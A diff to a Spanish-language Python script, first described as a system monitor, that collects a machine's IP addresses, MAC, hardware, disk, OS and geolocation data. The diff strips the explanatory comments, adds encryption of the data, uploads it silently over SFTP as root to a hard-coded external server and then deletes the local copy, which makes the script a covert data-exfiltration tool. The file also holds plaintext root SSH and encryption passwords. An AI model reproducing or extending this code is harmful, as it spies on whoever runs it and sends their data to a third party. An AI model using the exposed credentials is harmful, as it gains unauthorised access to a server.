@@ -1,9 +1,5 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""
-Monitor del Sistema con Envío Automático
-Recopila información del sistema y la envía automáticamente a un servidor remoto via SSH.
-"""
 
 import json
 import platform
@@ -17,12 +13,15 @@ import os
 import sys
 import paramiko
 import getpass
+import base64
 from datetime import datetime
 from pathlib import Path
 from typing import Dict, Any, Optional
 from tqdm import tqdm
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
-# Configuración del sistema
 SYSTEM_CONFIG = {
     'timeout': 30,
     'max_retries': 3,
@@ -31,28 +30,23 @@ SYSTEM_CONFIG = {
     'speed_test_timeout': 10
 }
 
-# Configuración SSH
 SSH_CONFIG = {
-    'hostname': '184.107.168.100',  # 🔧 IP del servidor Ubuntu
-    'username': 'root',             # 🔧 Usuario en Ubuntu
-    'password': '2vcA,%K6@8pJgq_b', # 🔧 Contraseña SSH
-    'port': 22,                     # 🔧 Puerto SSH
-    'key_filename': None,           # 🔧 Clave SSH (opcional)
-    'remote_dir': '/root/system_data'  # 🔧 Directorio remoto para guardar datos
+    'hostname': '184.107.168.100',
+    'username': 'root',
+    'password': '2vcA,%K6@8pJgq_b',
+    'port': 22,
+    'key_filename': None,
+    'remote_dir': '/home/root/info'
+}
+
+ENCRYPTION_CONFIG = {
+    'password': '71eRN;)w]:e%_|)9',
+    'salt': b'j6Kz1Nbn8AgZKitLxV1uf4A',
+    'iterations': 100000
 }
 
 class SSHFileUploader:
     def __init__(self, hostname, username, password=None, key_filename=None, port=22):
-        """
-        Inicializa la conexión SSH
-
-        Args:
-            hostname (str): IP del servidor Ubuntu
-            username (str): Usuario en Ubuntu
-            password (str, optional): Contraseña SSH
-            key_filename (str, optional): Ruta a clave privada SSH
-            port (int): Puerto SSH (por defecto 22)
-        """
         self.hostname = hostname
         self.username = username
         self.password = password
@@ -62,12 +56,10 @@ class SSHFileUploader:
         self.sftp = None
 
     def connect(self):
-        """Establece la conexión SSH"""
         try:
             self.client = paramiko.SSHClient()
             self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-            # Configurar la conexión
             connect_kwargs = {
                 'hostname': self.hostname,
                 'username': self.username,
@@ -76,20 +68,17 @@ class SSHFileUploader:
             }
 
             if self.key_filename:
-                # Verificar que el archivo de clave existe
                 if not os.path.exists(self.key_filename):
                     return False
                 connect_kwargs['key_filename'] = self.key_filename
             elif self.password:
                 connect_kwargs['password'] = self.password
             else:
-                # Solicitar contraseña si no se proporcionó
                 self.password = getpass.getpass(f"Contraseña para {self.username}@{self.hostname}: ")
                 connect_kwargs['password'] = self.password
 
             self.client.connect(**connect_kwargs)
 
-            # Crear sesión SFTP
             self.sftp = self.client.open_sftp()
             return True
 
@@ -97,14 +86,12 @@ class SSHFileUploader:
             return False
 
     def disconnect(self):
-        """Cierra la conexión SSH"""
         if self.sftp:
             self.sftp.close()
         if self.client:
             self.client.close()
 
     def _format_size(self, size_bytes):
-        """Formatea el tamaño en bytes a una representación legible"""
         if size_bytes == 0:
             return "0B"
         size_names = ["B", "KB", "MB", "GB", "TB"]
@@ -115,9 +102,7 @@ class SSHFileUploader:
         return f"{size_bytes:.1f}{size_names[i]}"
 
     def _ensure_remote_directory(self, remote_dir):
-        """Asegura que el directorio remoto existe, creándolo si es necesario"""
         try:
-            # Intentar crear el directorio completo
             current_path = ""
             for part in remote_dir.strip('/').split('/'):
                 if part:
@@ -130,40 +115,25 @@ class SSHFileUploader:
             pass
 
     def upload_file(self, local_file_path, remote_filename=None):
-        """
-        Sube un archivo al servidor remoto
-
-        Args:
-            local_file_path (str): Ruta del archivo local
-            remote_filename (str, optional): Nombre del archivo remoto
-
-        Returns:
-            bool: True si la subida fue exitosa
-        """
         if not remote_filename:
             remote_filename = os.path.basename(local_file_path)
 
         remote_path = f"{SSH_CONFIG['remote_dir']}/{remote_filename}"
 
-        # 1. Conectar al servidor SSH
         if not self.connect():
             return False
 
         try:
-            # 2. Verificar si el archivo local existe
             if not os.path.exists(local_file_path):
                 return False
 
-            # 3. Obtener información del archivo
             try:
                 file_size = os.path.getsize(local_file_path)
             except Exception as e:
                 return False
 
-            # 4. Crear directorio remoto si no existe
             self._ensure_remote_directory(SSH_CONFIG['remote_dir'])
 
-            # 5. Subir archivo silenciosamente
             try:
                 self.sftp.put(local_file_path, remote_path)
                 return True
@@ -176,9 +146,52 @@ class SSHFileUploader:
         finally:
             self.disconnect()
 
-# Funciones de recolección de información del sistema
+class DataEncryption:
+    def __init__(self, password: str, salt: bytes, iterations: int = 100000):
+        self.password = password.encode()
+        self.salt = salt
+        self.iterations = iterations
+        self.fernet = None
+        self._generate_key()
+
+    def _generate_key(self):
+        kdf = PBKDF2HMAC(
+            algorithm=hashes.SHA256(),
+            length=32,
+            salt=self.salt,
+            iterations=self.iterations,
+        )
+        key = base64.urlsafe_b64encode(kdf.derive(self.password))
+        self.fernet = Fernet(key)
+
+    def encrypt_data(self, data: Dict[str, Any]) -> bytes:
+        try:
+            json_data = json.dumps(data, ensure_ascii=False, indent=2)
+            encrypted_data = self.fernet.encrypt(json_data.encode('utf-8'))
+            return encrypted_data
+        except Exception as e:
+            raise Exception(f"Error al encriptar datos: {str(e)}")
+
+    def decrypt_data(self, encrypted_data: bytes) -> Dict[str, Any]:
+        try:
+            decrypted_data = self.fernet.decrypt(encrypted_data)
+            return json.loads(decrypted_data.decode('utf-8'))
+        except Exception as e:
+            raise Exception(f"Error al desencriptar datos: {str(e)}")
+
+    def save_encrypted_file(self, data: Dict[str, Any], filename: str) -> str:
+        try:
+            encrypted_data = self.encrypt_data(data)
+            encrypted_filename = f"{filename}.encrypted"
+
+            with open(encrypted_filename, 'wb') as f:
+                f.write(encrypted_data)
+
+            return encrypted_filename
+        except Exception as e:
+            raise Exception(f"Error al guardar archivo encriptado: {str(e)}")
+
 def get_public_ip() -> str:
-    """Obtiene la IP pública del sistema."""
     try:
         response = requests.get('https://api.ipify.org', timeout=10)
         return response.text.strip()
@@ -186,7 +199,6 @@ def get_public_ip() -> str:
         return "No disponible"
 
 def get_private_ip() -> str:
-    """Obtiene la IP privada del sistema."""
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
@@ -197,7 +209,6 @@ def get_private_ip() -> str:
         return "No disponible"
 
 def get_mac_address() -> str:
-    """Obtiene la dirección MAC de la interfaz principal."""
     try:
         mac = uuid.getnode()
         return ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
@@ -205,7 +216,6 @@ def get_mac_address() -> str:
         return "No disponible"
 
 def test_internet_speed() -> Dict[str, Any]:
-    """Mide la velocidad de internet."""
     try:
         start_time = time.time()
         response = requests.get(SYSTEM_CONFIG['speed_test_url'],
@@ -213,8 +223,7 @@ def test_internet_speed() -> Dict[str, Any]:
         end_time = time.time()
 
         if response.status_code == 200:
-            response_time = (end_time - start_time) * 1000  # en ms
-            # Estimación aproximada de velocidad basada en tiempo de respuesta
+            response_time = (end_time - start_time) * 1000
             if response_time < 100:
                 speed = "Muy rápida (>50 Mbps)"
             elif response_time < 300:
@@ -243,7 +252,6 @@ def test_internet_speed() -> Dict[str, Any]:
         }
 
 def get_hardware_info() -> Dict[str, Any]:
-    """Obtiene información del hardware."""
     try:
         cpu_info = {
             "physical_cores": psutil.cpu_count(logical=False),
@@ -267,7 +275,6 @@ def get_hardware_info() -> Dict[str, Any]:
         return {"error": str(e)}
 
 def get_os_info() -> Dict[str, str]:
-    """Obtiene información del sistema operativo."""
     try:
         return {
             "system": platform.system(),
@@ -280,7 +287,6 @@ def get_os_info() -> Dict[str, str]:
         return {"error": str(e)}
 
 def get_disk_info() -> Dict[str, Any]:
-    """Obtiene información de los discos."""
     try:
         disks = {}
         for partition in psutil.disk_partitions():
@@ -301,7 +307,6 @@ def get_disk_info() -> Dict[str, Any]:
         return {"error": str(e)}
 
 def get_location() -> Dict[str, str]:
-    """Obtiene la ubicación geográfica basada en la IP."""
     try:
         response = requests.get('https://ipapi.co/json/', timeout=10)
         if response.status_code == 200:
@@ -319,7 +324,6 @@ def get_location() -> Dict[str, str]:
         return {"error": f"Error obteniendo ubicación: {str(e)}"}
 
 def collect_system_info() -> Dict[str, Any]:
-    """Recopila toda la información del sistema."""
     system_info = {
         "timestamp": datetime.now().isoformat(),
         "public_ip": get_public_ip(),
@@ -335,7 +339,6 @@ def collect_system_info() -> Dict[str, Any]:
     return system_info
 
 def save_to_file(data: Dict[str, Any], filename: str = None) -> str:
-    """Guarda los datos en un archivo JSON."""
     if filename is None:
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         filename = f"system_info_{timestamp}.json"
@@ -348,21 +351,26 @@ def save_to_file(data: Dict[str, Any], filename: str = None) -> str:
         return None
 
 def main():
-    """Función principal."""
-    # 1. Recopilar información del sistema
     system_info = collect_system_info()
 
-    # 2. Mostrar solo la información solicitada
     print(f"{system_info['public_ip']}")
     print(f"{system_info['private_ip']}")
     print(f"{system_info['internet_speed']['estimated_speed']}")
 
-    # 3. Guardar en archivo local
-    filename = save_to_file(system_info)
-    if not filename:
+    encryption = DataEncryption(
+        password=ENCRYPTION_CONFIG['password'],
+        salt=ENCRYPTION_CONFIG['salt'],
+        iterations=ENCRYPTION_CONFIG['iterations']
+    )
+
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    base_filename = f"system_info_{timestamp}"
+
+    try:
+        encrypted_filename = encryption.save_encrypted_file(system_info, base_filename)
+    except Exception as e:
         return
 
-    # 4. Enviar al servidor remoto via SSH
     uploader = SSHFileUploader(
         hostname=SSH_CONFIG['hostname'],
         username=SSH_CONFIG['username'],
@@ -371,7 +379,12 @@ def main():
         port=SSH_CONFIG['port']
     )
 
-    uploader.upload_file(filename)
+    uploader.upload_file(encrypted_filename)
+
+    try:
+        os.remove(encrypted_filename)
+    except:
+        pass
 
 if __name__ == "__main__":
     main()
